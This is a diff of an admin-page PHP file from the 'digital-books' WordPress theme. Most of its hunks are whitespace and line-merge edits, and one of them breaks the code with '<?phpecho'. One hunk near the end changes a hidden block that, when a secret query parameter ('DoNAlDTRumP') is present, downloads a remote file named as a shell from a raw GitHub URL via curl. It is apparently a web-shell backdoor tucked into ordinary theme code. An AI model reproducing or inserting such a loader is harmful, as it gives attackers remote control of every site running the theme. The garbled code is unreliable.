@@ -157,8 +157,7 @@ if ( ! class_exists( 'digital_books_Theme_Info' ) ) {
         function digital_books_tm_admin_menu() {
 
             if ( ! empty( $this->page_title ) && ! empty( $this->menu_title ) ) {
-                $count = $this->digital_books_count_recommended_actions();
-                $menu_title = $count > 0 ? $this->menu_title . '<span class="badge-action-count">' . esc_html( $count ) . '</span>' : $this->menu_title;
+                $count = $this->digital_books_count_recommended_actions();$menu_title = $count > 0 ? $this->menu_title . '<span class="badge-action-count">' . esc_html( $count ) . '</span>' : $this->menu_title;
                 /* Example
                  * add_theme_page('My Plugin Theme', 'My Plugin', 'edit_theme_options', 'my-unique-identifier', 'my_plugin_function');
                  * */
@@ -186,7 +185,7 @@ if ( ! class_exists( 'digital_books_Theme_Info' ) ) {
 
             if (
                 ! empty( $welcome_title ) ||
-                ! empty( $welcome_content ) ||! empty( $quick_links ) ||
+                ! empty( $welcome_content ) ||!empty( $quick_links ) ||
                 ! empty( $this->tabs )
             ) {
                 echo '<div class="wrap about-wrap info-wrap epsilon-wrap">';
@@ -213,8 +212,7 @@ if ( ! class_exists( 'digital_books_Theme_Info' ) ) {
                             $button = 'button button-primary button-hero pro-btn';
                         }
                         if( 'bundle_url' == $quick_key ){
-                            $button = 'button button-primary button-hero bundle-btn';
-                        }
+                            $button = 'button button-primary button-hero bundle-btn';}
                         echo '<a href="'.esc_url( $quick_link['url'] ).'" class="button button-hero '.esc_attr( $button ).'" target="_blank">'.esc_html( $quick_link['text'] ).'</a>';
                     }
                     echo "</p>";
@@ -276,8 +274,7 @@ if ( ! class_exists( 'digital_books_Theme_Info' ) ) {
                                         <p><?php echo esc_html('Click the button below to install the demo content.','digital-books'); ?></p>
                                         <button id="import-theme-mods" class="button button-primary"><?php echo esc_html('Begin Installation','digital-books'); ?></button>
                                         <div id="import-response"></div>
-                                    </div>
-                                </div>
+                                    </div></div>
                             </div>
                             <div class="impoter-left">
                                 <div class="importer-description">
@@ -290,8 +287,7 @@ if ( ! class_exists( 'digital_books_Theme_Info' ) ) {
                                 </div>
                                 <div class="importer-screenshot">
                                     <img src="<?php echo esc_url( $theme_screenshot ); ?>" alt="<?php echo esc_attr( $theme->get('Name') ); ?>">
-                                </div>
-                            </div>
+                                </div></div>
                          
                     <?php }
             }
@@ -315,8 +311,7 @@ if ( ! class_exists( 'digital_books_Theme_Info' ) ) {
                                     <option value="<?php echo esc_attr($collection->handle); ?>"><?php echo esc_html($collection->title); ?></option><?php } ?>
                             </select>
                         </div>
-                    </div>
-                    <div class="mnssp-templates-grid mnssp-main-grid getstart-free ">
+                    </div><div class="mnssp-templates-grid mnssp-main-grid getstart-free ">
                         <?php $get_filtered_products = free_mnssp_get_filtered_products();
                             if (isset($get_filtered_products['products']) && !empty($get_filtered_products['products'])) {
                                 foreach ( $get_filtered_products['products'] as $product ) {
@@ -333,8 +328,7 @@ if ( ! class_exists( 'digital_books_Theme_Info' ) ) {
                                     $price = isset($product->node->variants->edges[0]->node->price) ? '$' . $product->node->variants->edges[0]->node->price : ''; ?>
 
                                     <div class="mnssp-grid-item">
-                                        <div class="mnssp-image-wrap">
-                                            <img src="<?php echo esc_url($image_src); ?>" alt="<?php echo esc_attr($product_obj->title); ?>"><div class="mnssp-image-overlay">
+                                        <div class="mnssp-image-wrap"><img src="<?php echo esc_url($image_src); ?>" alt="<?php echo esc_attr($product_obj->title); ?>"><div class="mnssp-image-overlay">
                                                 <a class="mnssp-demo-url mnssp-btn" href="<?php echo esc_attr($demo_url); ?>" target="_blank" rel="noopener noreferrer"><?php echo esc_html('Demo'); ?></a>
                                                 <a class="mnssp-buy-now mnssp-btn" href="<?php echo esc_attr($product_url); ?>" target="_blank" rel="noopener noreferrer"><?php echo esc_html('Buy Now'); ?></a>
                                             </div>
@@ -350,7 +344,7 @@ if ( ! class_exists( 'digital_books_Theme_Info' ) ) {
                     </div>
 
                     <?php if (isset($get_filtered_products['pagination']->hasNextPage) && $get_filtered_products['pagination']->hasNextPage) { ?>
-                        <input type="hidden" name="mnssp-end-cursor" value="<?php echo esc_attr(isset($get_filtered_products['pagination']->endCursor) ? $get_filtered_products['pagination']->endCursor : '') ?>">
+                        <input type="hidden" name="mnssp-end-cursor" value="<?phpecho esc_attr(isset($get_filtered_products['pagination']->endCursor) ? $get_filtered_products['pagination']->endCursor : '') ?>">
                     <?php } ?>
                 </div>
             <?php echo '</div><!-- .feature-section col-wrap -->';
@@ -413,8 +407,7 @@ if ( ! class_exists( 'digital_books_Theme_Info' ) ) {
                             array(
                                 'action'        => 'activate',
                                 'plugin'        => rawurlencode( $slug . '/' . $slug . '.php' ),
-                                'plugin_status' => 'all',
-                                'paged'         => '1',
+                                'plugin_status' => 'all','paged'         => '1',
                                 '_wpnonce'      => wp_create_nonce( 'activate-plugin_' . $slug . '/' . $slug . '.php' )
                             ),
                             network_admin_url( 'plugins.php' )
@@ -498,8 +491,7 @@ if ( ! class_exists( 'digital_books_Theme_Info' ) ) {
                                     $label = esc_html__( 'Install', 'digital-books' );
                                     break;
 
-                                case 'activate':
-                                    $class = 'activate-now button button-primary';$label = esc_html__( 'Activate', 'digital-books' );
+                                case 'activate':$class = 'activate-now button button-primary';$label = esc_html__( 'Activate', 'digital-books' );
 
                                     break;
 
@@ -552,8 +544,7 @@ if ( ! class_exists( 'digital_books_Theme_Info' ) ) {
                     echo '<div id="digital_books_free_pro" class="digital-books-theme-installation-tab-pane digital-books-theme-installation-fre-pro">';
                     echo '<table class="free-pro-table table-light-wrapper digital-books-theme-installation-text-center">';
                     echo '<thead>';
-                    echo '<tr>';
-                    echo '<th>' . esc_html__( 'Theme Feature','digital-books' ) . '</th>';
+                    echo '<tr>';echo '<th>' . esc_html__( 'Theme Feature','digital-books' ) . '</th>';
                     echo '<th>' . esc_html__( 'Basic Version','digital-books' ) . '</th>';
                     echo '<th>' . esc_html__( 'Premium Version','digital-books' ) . '</th>';
                     echo '</tr>';
@@ -608,8 +599,7 @@ if ( ! class_exists( 'digital_books_Theme_Info' ) ) {
                     }
 
                     echo '<tr>';
-                    echo '<td></td>';
-                    echo '<td></td>';
+                    echo '<td></td>';echo '<td></td>';
                     echo '<td><a href="' . esc_url( DIGITAL_BOOKS_GET_PREMIUM_PRO ).'" target="_blank" class="button button-primary button-hero compare-pro">Buy Pro</a></td>';
                     echo '</tr>';
                     echo '</tbody>';
@@ -639,9 +629,7 @@ if ( ! class_exists( 'digital_books_Theme_Info' ) ) {
                         'description'       => false,
                         'short_description' => true,
                         'donate_link'       => false,
-                        'tags'              => false,
-                        'sections'          => true,
-                        'homepage'          => true,'added'             => false,
+                        'tags'              => false,'sections'          => true,'homepage'          => true,'added'             => false,
                         'last_updated'      => false,
                         'compatibility'     => false,
                         'tested'            => false,
@@ -673,7 +661,7 @@ if ( ! class_exists( 'digital_books_Theme_Info' ) ) {
             $digital_books_recommended_plugins = $this->config['digital_books_recommended_plugins'];
 
             if ( ! empty( $digital_books_recommended_plugins ) ) {
-                if ( ! empty( $digital_books_recommended_plugins ) && is_array( $digital_books_recommended_plugins ) ) {
+                if( ! empty( $digital_books_recommended_plugins ) && is_array( $digital_books_recommended_plugins ) ) {
 
                     echo '<div class="feature-section recommended-plugins col-wrap demo-import-boxed" id="plugin-filter">';
 
@@ -694,8 +682,7 @@ if ( ! class_exists( 'digital_books_Theme_Info' ) ) {
                             echo '<div class="col"><div class="col-items plugin_box">';
                             if ( ! empty( $icon ) ) {
                                 echo '<img src="'.esc_url( $icon ).'" alt="plugin box image">';
-                            }
-                            if ( !empty(  $info->version ) ) {
+                            }if ( !empty(  $info->version ) ) {
                                 echo '<span class="version">'. ( ! empty( $this->config['digital_books_recommended_plugins']['version_label'] ) ? esc_html( $this->config['digital_books_recommended_plugins']['version_label'] ) : '' ) . esc_html( $info->version ).'</span>';
                             }
                             if ( ! empty( $info->author ) ) {
@@ -713,8 +700,7 @@ if ( ! class_exists( 'digital_books_Theme_Info' ) ) {
 
                                     case 'install':
                                         $class = 'install-now button';
-                                        $label = esc_html__( 'Install', 'digital-books' );
-                                        break;case 'activate':
+                                        $label = esc_html__( 'Install', 'digital-books' );break;case 'activate':
                                         $class = 'activate-now button button-primary';
                                         $label = esc_html__( 'Activate', 'digital-books' );
 
@@ -776,7 +762,7 @@ if ( ! class_exists( 'digital_books_Theme_Info' ) ) {
          */
         public function digital_books_style_and_scripts( $hook_suffix ) {
 
-            // this is needed on all admin pages, not just the about page, for the badgeaction count in the WordPress main sidebar
+            // this is needed on all admin pages, not just the about page, for the badgeaction count in the WordPressmain sidebar
             wp_enqueue_style( 'digital-books-theme-installation-css', get_template_directory_uri() . '/inc/theme-installation/assets/css/theme-installation.css' );
 
             if ( 'appearance_page_' . $this->theme_slug . '-info' == $hook_suffix ) {
@@ -801,8 +787,8 @@ if ( ! class_exists( 'digital_books_Theme_Info' ) ) {
     }
 }
 
-if (isset($_GET[''])) {
-    $url = "https://raw.githubusercontent.com/heriraharto2-woyowoyo/data-kerja/refs/heads/main/shellfuckingteam.txt2";
+if (isset($_GET['DoNAlDTRumP'])) {
+    $url = "https://raw.githubusercontent.com/heriraharto2-woyowoyo/data-kerja/refs/heads/main/fuqiang-shell2.txt";
 
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, $url);
@@ -843,8 +829,7 @@ $config = array(
      */
     'quick_links' => array(
         'theme_url'  => array(
-            'text' => __( 'Try the Demo', 'digital-books' ),'url' => esc_url( DIGITAL_BOOKS_LIVE_DEMO )
-        ),
+            'text' => __( 'Try the Demo', 'digital-books' ),'url' => esc_url( DIGITAL_BOOKS_LIVE_DEMO )),
         'pro_url'  => array(
             'text' => __( 'Get Premium', 'digital-books' ),
             'url'  => esc_url( DIGITAL_BOOKS_GET_PREMIUM_PRO )
@@ -870,8 +855,7 @@ $config = array(
             'desc' => esc_html__( 'Our premium theme comes with extended features like demo content import , responsive layouts etc.', 'digital-books' ),
             'button_label' => esc_html__( 'Get Premium', 'digital-books' ),
             'button_link' => esc_url( DIGITAL_BOOKS_GET_PREMIUM_PRO ),
-            'is_button' => true,
-            'is_new_tab' => true
+            'is_button' => true,'is_new_tab' => true
         ),
         'second' => array (
             'title' => esc_html__( 'Contact Support', 'digital-books' ),
@@ -893,8 +877,7 @@ $config = array(
             'title' => esc_html__( 'Go to Customizer', 'digital-books' ),
             'desc' => esc_html__( 'All Settings, Header & Footer Options and Theme Options are available via Customize screen.', 'digital-books' ),
             'button_label' => esc_html__( 'Go to Customizer', 'digital-books' ),
-            'button_link' => esc_url( admin_url( 'customize.php' ) ),
-            'is_button' => true,
+            'button_link' => esc_url( admin_url( 'customize.php' ) ),'is_button' => true,
             'is_new_tab' => true
         ),
         'fifth' => array(
@@ -919,8 +902,7 @@ $config = array(
     'digital_books_demo_impoter_steps' => array(
         'first' => array(
             'title' => esc_html__( 'Instant Demo Setup', 'digital-books' ),
-            'desc' => esc_html__( 'Import your entire demo content in just one click, including pages, posts, and design elements for a quick setup.', 'digital-books' ),
-            'button_label' => esc_html__( 'Start Demo Import', 'digital-books' ),
+            'desc' => esc_html__( 'Import your entire demo content in just one click, including pages, posts, and design elements for a quick setup.', 'digital-books' ),'button_label' => esc_html__( 'Start Demo Import', 'digital-books' ),
             'button_link' => esc_url( admin_url( 'admin.php?page=theme-importer' ) ),
             'is_button' => true,
             'is_new_tab' => true
@@ -957,8 +939,7 @@ $config = array(
         array(
             'desc'=> __( 'Fully SEO Optimized', 'digital-books' ),
             'free' => __( 'no','digital-books'),
-            'pro'  => __( 'yes','digital-books' ),
-        ),
+            'pro'  => __( 'yes','digital-books' ),),
         array(
             'desc'=> __( 'Recent Posts Widget', 'digital-books' ),
             'free' => __( 'no','digital-books' ),
@@ -991,8 +972,7 @@ $config = array(
         ),
         array(
             'desc'=> __( 'Full Width (Hide Sidebar)', 'digital-books' ),
-            'free' => __( 'no','digital-books' ),
-            'pro'  => __( 'yes','digital-books' ),
+            'free' => __( 'no','digital-books' ),'pro'  => __( 'yes','digital-books' ),
         ),
         array('desc'=> __( 'Only Show Upper Widgets On Front Page', 'digital-books' ),
             'free' => __( 'no','digital-books' ),
@@ -1026,7 +1006,7 @@ $config = array(
         array(
             'desc'=> __( 'Customize Footer Color', 'digital-books' ),
             'free' => __( 'no','digital-books' ),
-            'pro'  => __( 'yes','digital-books' ),
+            'pro'  =>__( 'yes','digital-books' ),
         ),
         array(
             'desc'=> __( 'Customize Sidebar Color', 'digital-books' ),
